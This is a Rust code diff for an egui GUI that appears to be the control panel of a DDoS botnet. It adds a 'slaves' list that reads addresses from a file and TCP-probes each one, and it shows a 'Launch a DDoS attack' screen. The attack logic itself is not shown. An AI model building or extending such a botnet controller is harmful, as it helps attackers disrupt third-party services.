@@ -1,13 +1,19 @@
+use egui::{RichText, Color32};
 use regex::Regex;
 //
 static mut test : bool = false;
-static mut frame_selected : &str = "default";
+static mut frame_selected : &str = "attack_launch";
+static mut slave_list_frame_changed : bool = true;
+static mut number_of_slaves: u32 = 0;
 //
 
 fn is_a_valid_ip(ip: &str) -> bool {
     let re = Regex::new(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}:[0-9]{1,5}$").unwrap();
     re.is_match(ip)
 }
+
+
+
 
 /// We derive Deserialize/Serialize so we can persist app state on shutdown.
 #[derive(serde::Deserialize, serde::Serialize)]
@@ -17,6 +23,8 @@ pub struct TemplateApp {
     label: String,
     ip_new_slave: String,
     ip_target: String,
+    vec_state : Vec<String>,
+    vec_ip : Vec<String>,
 
     // this how you opt-out of serialization of a member
     #[serde(skip)]
@@ -31,6 +39,8 @@ impl Default for TemplateApp {
             ip_target: "127.0.0.1:8080".to_owned(),
             ip_new_slave: "137.194.33.11".to_owned(),
             value: 2.7, 
+            vec_ip: vec![String::from("128.0.0.1:8080")],
+            vec_state: vec![String::from("Unknown")],
         }
     }
 }
@@ -60,7 +70,7 @@ impl eframe::App for TemplateApp {
     /// Called each time the UI needs repainting, which may be many times per second.
     /// Put your widgets into a `SidePanel`, `TopPanel`, `CentralPanel`, `Window` or `Area`.
     fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
-        let Self { label, value, ip_new_slave, ip_target } = self;
+        let Self { label, value, ip_new_slave, ip_target, vec_state, vec_ip } = self;
 
         // Examples of how to create different panels and windows.
         // Pick whichever suits you.
@@ -138,12 +148,104 @@ impl eframe::App for TemplateApp {
             unsafe{
                 match frame_selected{
                     "slaves_list" =>{
+
+                        println!("retry");
+                        println!("Réexécution");
+
+                        /*
+                        unsafe{
+                            for i in 0..(number_of_slaves as usize){
+                                ui.horizontal(|ui| {
+                                    ui.label(RichText::new(vec_ip.get(i).unwrap()));
+                                    ui.label(RichText::new("-"));
+                                    ui.label(RichText::new(vec_state.get(i).unwrap()).color(Color32::RED));
+                                });
+                            }
+                        };
+                        */
+
+                        //refresh closure
+                        let mut refresh_slaves = || {
+                            //show slaves definition
+                            let mut number_of_connected_slaves : i32 = 0;
+                            let mut number_of_disconnected_slaves : i32 = 0;
+                            let res = read_string_from_file("./src/slaves.txt").unwrap();
+                            let mut vec_ip : Vec<String> = Vec::new();
+                            let mut vec_state : Vec<String> = Vec::new();
+                            let mut counter = 0;
+                            for line in res.lines() {
+                                let mut state : &str;
+                                match TcpStream::connect(line.clone()){
+                                    Ok(_) =>{
+                                        number_of_connected_slaves += 1;
+                                        state = "connected";
+                                    },
+                                    Err(_) => {
+                                        number_of_disconnected_slaves += 1;
+                                        state = "disconnected";
+                                    },
+                                };
+                                //format!("{}{}{}", line.clone(), " - ", state.clone())
+                                vec_ip.push(String::from(line.clone()));
+                                vec_state.push(String::from(state.clone()));
+                                counter+=1;
+                            }
+                            unsafe{number_of_slaves = counter};
+                        
+                            ui.heading("Show current slaves");
+                        
+                            for i in 0..vec_ip.len(){
+                                ui.horizontal(|ui| {
+                                    ui.label(RichText::new(vec_ip.get(i).unwrap()));
+                                    ui.label(RichText::new("-"));
+                                    ui.label(RichText::new(vec_state.get(i).unwrap()).color(Color32::RED));
+                                });
+                            }
+                        };
+                        
                         ui.heading("Show current slaves");
-                        //ui.hyperlink("https://github.com/emilk/eframe_template");
-                        ui.add(egui::github_link_file!(
-                            "https://github.com/emilk/eframe_template/blob/master/",
-                            "127.0.0.1:8080 - connected"
-                        ));
+                        if ui.button("refresh").clicked(){
+                            //refresh_slaves();
+                            //show slaves definition
+                            let mut number_of_connected_slaves : i32 = 0;
+                            let mut number_of_disconnected_slaves : i32 = 0;
+                            let res = read_string_from_file("./src/slaves.txt").unwrap();
+                            let mut vec_ip : Vec<String> = Vec::new();
+                            let mut vec_state : Vec<String> = Vec::new();
+                            let mut counter = 0;
+                            for line in res.lines() {
+                                let mut state : &str;
+                                match TcpStream::connect(line.clone()){
+                                    Ok(_) =>{
+                                        number_of_connected_slaves += 1;
+                                        state = "connected";
+                                    },
+                                    Err(_) => {
+                                        number_of_disconnected_slaves += 1;
+                                        state = "disconnected";
+                                    },
+                                };
+                                //format!("{}{}{}", line.clone(), " - ", state.clone())
+                                vec_ip.push(String::from(line.clone()));
+                                vec_state.push(String::from(state.clone()));
+                                counter+=1;
+                            }
+                            unsafe{number_of_slaves = counter};
+                        
+                            println!("{:?}", vec_ip);
+                            println!("{:?}", vec_state);
+
+                            
+                            for i in 0..vec_ip.len(){
+                                ui.horizontal(|ui| {
+                                    ui.label(RichText::new(vec_ip.get(i).unwrap()));
+                                    ui.label(RichText::new("-"));
+                                    ui.label(RichText::new(vec_state.get(i).unwrap()).color(Color32::RED));
+                                });
+                            }
+                            
+                        };
+                        
                     },
                     "slaves_add" =>{
                         ui.heading("Add a new slave");
@@ -160,6 +262,8 @@ impl eframe::App for TemplateApp {
                                 println!("Invalid IP address");
                             }
                         };
+
+                        unsafe{slave_list_frame_changed=true;};
                     },
                     "attack_launch" =>{
                         ui.heading("Launch a DDoS attack");
@@ -176,6 +280,7 @@ impl eframe::App for TemplateApp {
                                 println!("Invalid IP address");
                             }
                         };
+                        unsafe{slave_list_frame_changed=true;};
                     },
                     _ =>{
                         ui.heading("eframe DEFAULT");
@@ -184,6 +289,7 @@ impl eframe::App for TemplateApp {
                             "https://github.com/emilk/eframe_template/blob/master/",
                             "127.0.0.1:8080 - connected"
                         ));
+                        unsafe{slave_list_frame_changed=true;};
                     }
                 }
             };
